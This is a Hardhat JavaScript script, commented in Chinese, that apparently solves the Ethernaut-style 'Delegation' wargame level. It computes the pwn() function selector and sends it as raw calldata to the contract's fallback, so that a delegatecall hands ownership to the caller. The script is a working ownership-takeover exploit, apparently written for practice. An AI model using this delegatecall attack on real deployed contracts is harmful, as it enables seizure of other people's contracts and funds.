import hre from "hardhat";
import { keccak256 } from "@ethersproject/keccak256";
import { toUtf8Bytes } from '@ethersproject/strings';


async function encodeFunctionSignature(name, argTypes) {
    let args = "";
    if (argTypes) {
        if (Array.isArray(argTypes)) {
            argTypes.forEach(element => {
                if (args.length > 0) {
                    args += ",";
                }
                args += element;
            });
        } else {
            args = argTypes;
        }
    }
    const sig = `${name}(${args})`;
    console.log(sig);
    return keccak256(toUtf8Bytes(sig)).substring(0, 10);
}

async function main() {
    const [signer] = await hre.ethers.getSigners();
    console.log("我的帳戶地址 by hre: ", signer.address);

    // 請將此地址替換成部署的 Delegation 合約地址
    const delegationAddress = "0x259B3712779789cC4eb93Aac4274C5b82c38C828"; 

    const delegation = await hre.ethers.getContractAt("Delegation", delegationAddress);

    const Owner = await delegation.owner();
    console.log("目前所有者:", Owner);

    // 體驗一下全域變數 msg.data 的效果
    // console.log("getDate: ", await delegation.getData());
    // 會回傳  0x3bc5de30 ，這是 getData() 的函數選擇器的ID。一共 4個 字節： 3b c5 de 30

    // 計算 pwn() 函數的函數選擇器，根據最新版 ethers.js id() 已被移除
    // const pwnSelector = ethers.utils.id("pwn()").slice(0, 10); // 取前四個字節
    // console.log("pwn() selector:", pwnSelector);

    // 計算 pwn() 的 function selector (前4個 bytes)，根據最新版 ethers.js id() 已被移除
    // const functionSelector = ethers.utils.hexDataSlice(ethers.utils.id("pwn()"),0,4);
    // console.log("pwn() selector:", functionSelector);

    const functionSelector = await encodeFunctionSignature("pwn"); // 0xdd365b8b
    console.log("pwn() selector:", functionSelector);

    console.log("發送交易呼叫 fallback, 使用 pwn() 的 calldata...");
    const tx = await signer.sendTransaction({
        to: delegationAddress,
        data: functionSelector,
        gasLimit: 100000
    });
    console.log("交易發送中，交易哈希:", tx.hash);
    const receipt = await tx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);

    const newOwner = await delegation.owner();
    console.log("新的所有者:", newOwner);
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});